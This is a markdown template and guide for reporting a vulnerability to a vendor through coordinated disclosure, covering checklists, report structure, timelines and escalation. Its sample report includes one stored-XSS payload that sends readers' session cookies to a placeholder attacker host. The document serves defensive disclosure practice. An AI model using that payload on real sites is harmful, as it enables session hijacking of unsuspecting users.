# Coordinated Vulnerability Disclosure — Template

> Email / report template for reporting a discovered vulnerability to a vendor's security team (bug bounty, VDP, or unsolicited). Authorized testing only — do not disclose vulnerabilities you found by violating ToS.

## TL;DR
- Three audiences: bug-bounty platforms (HackerOne / Bugcrowd / Intigriti), vendor PSIRT, and "anything else" (security@ inboxes, GitHub Security Advisories).
- Per channel, the structure is similar: TL;DR → reproduction → impact → suggested fix → disclosure timeline.
- Coordinated disclosure norms: 90 days for the vendor to ship a fix (Google Project Zero convention). Vendor may request extension; reporter may grant or decline.
- Always send via the vendor's documented channel (RFC 9116 `security.txt` if present); don't cold-DM developers.

## Pre-submission checklist

- [ ] Identified the vendor's security channel: `https://target.tld/.well-known/security.txt` (RFC 9116), PSIRT email, bug bounty program scope.
- [ ] Verified the bug is in scope of the vendor's VDP / bounty program.
- [ ] Reproduced the bug at least twice on a clean test account / sandbox.
- [ ] Captured raw request/response, video (if a click chain), and isolated minimum payload.
- [ ] Stripped any third-party PII from the evidence (you don't want to send the vendor *their* user's data).
- [ ] Decided on a disclosure timeline you can defend (90 days is the standard floor).
- [ ] Prepared a fix recommendation (raises your signal).

## Template (email / web form)

```markdown
Subject: [Security] <Vulnerability class> in <product/feature> — <severity>

Hello <Vendor> Security Team,

I'd like to report a <CWE-XXX vulnerability class> in <product / endpoint /
feature>. I am writing under your VDP / bug bounty program / responsible
disclosure policy at <link>.

## TL;DR
- **Class**: <e.g. Stored Cross-Site Scripting>
- **Endpoint / component**: <e.g. https://app.target.tld/api/v1/comments>
- **Severity (my estimate)**: <e.g. High — CVSS 8.0>
- **Impact**: <one sentence>

## Reproduction
1. Authenticated as a normal user (test account `xxx`, created at <date>).
2. Browse to `https://app.target.tld/comments/new`.
3. Submit the following payload in the body field:
   ```
   <img src=x onerror="fetch('https://attacker.tld/?c='+document.cookie)">
   ```
4. The next user who views the comment thread executes the script in their
   browser. Captured cookies arrive at attacker-controlled listener within
   seconds.

(Attached: PCAP / HAR / video at <link to encrypted artefact>.)

## Impact
- Attacker can steal any reader's session cookie (HttpOnly is not set on the
  `session` cookie — confirmed via `Set-Cookie: session=...` response header).
- Stored, persistent — every viewer is affected until the comment is purged.
- Authenticated context required, but the application allows free signups, so
  the attacker can self-onboard.

## Suggested mitigation
- Output-encode user-submitted comment bodies at the rendering layer
  (template auto-escape; do not call `dangerouslySetInnerHTML`).
- Set `HttpOnly` and `SameSite=Strict` on the `session` cookie.
- Apply a Content Security Policy `script-src 'self' 'nonce-...'` to mitigate
  similar future bugs.

References:
- OWASP XSS Prevention Cheat Sheet: <url>
- OWASP WSTG-INPV-02: <url>
- CWE-79: <url>

## Disclosure timeline
- 2026-MM-DD: discovered.
- 2026-MM-DD: this report submitted.
- I propose a 90-day disclosure window. Public write-up not earlier than
  2026-MM-DD (90 days from submission). I'm flexible — happy to extend in
  good faith if a fix is in flight.

## Reporter
- Name / handle: <name or pseudonym>
- Contact: <email>, <PGP key fingerprint if any>
- Bug bounty program account: <handle on HackerOne / Bugcrowd>

Thanks for the consideration. I am happy to provide additional evidence or
clarification on request.

Regards,
<Reporter>
```

## Vendor-side response — what good looks like

- Acknowledge within 2 business days.
- Assign a severity / triage status within 5 business days.
- Periodic status updates (every 2 weeks at minimum during active remediation).
- Fix advisory + reporter credit (if requested).
- Disclosure coordination (vendor + reporter agree on date; CVE issued via vendor / NVD).

## When the vendor doesn't respond / acts in bad faith

- 30 days no response → polite ping with original report attached, CC a public listing if program lists supervisors.
- 60 days no response → escalate to a CERT (US-CERT / national-CERT / sectoral-CERT) for mediation. Document everything.
- 90 days no fix + no response → public disclosure is defensible if you:
  - Documented every contact attempt.
  - Provided sufficient detail in the original report.
  - Offered help during the window.
  - Don't publish a working exploit; publish only enough for defenders + users to protect themselves.
- Don't sell to brokers, don't disclose to a third party for compensation outside the bounty program — that's a different legal posture.

## Anti-patterns (don't)

- Reporting to support@ or marketing@ or any non-security channel. Use `security.txt` / VDP.
- Demanding payment for the vulnerability information ("pay me $X or I'll publish") — extortion, criminal.
- Disclosing to social media before the vendor (zero-day for clout). Defamatory in some jurisdictions; bridges burned forever in the industry.
- Including third-party PII you happened to extract during testing (that's a separate breach you just caused).
- Reusing the report for multiple vendors when the bug exists across them — separate disclosures, separate timelines per vendor.

## Sources
- ISO/IEC 29147:2018 — Vulnerability Disclosure: https://www.iso.org/standard/72311.html
- ISO/IEC 30111:2019 — Vulnerability Handling Processes: https://www.iso.org/standard/69725.html
- IETF RFC 9116 — A File Format to Aid in Security Vulnerability Disclosure (`security.txt`): https://datatracker.ietf.org/doc/html/rfc9116
- CERT/CC — Coordinated Vulnerability Disclosure Process: https://vuls.cert.org/confluence/display/CVD
- Google Project Zero — Vulnerability disclosure policy: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html
- CISA Coordinated Vulnerability Disclosure Process: https://www.cisa.gov/coordinated-vulnerability-disclosure-process
- disclose.io — Vulnerability disclosure project: https://disclose.io/
- HackerOne — Coordinated Vulnerability Disclosure: https://docs.hackerone.com/en/articles/9829406-coordinated-vulnerability-disclosure
- Bugcrowd — VRT (Vulnerability Rating Taxonomy): https://bugcrowd.com/vulnerability-rating-taxonomy
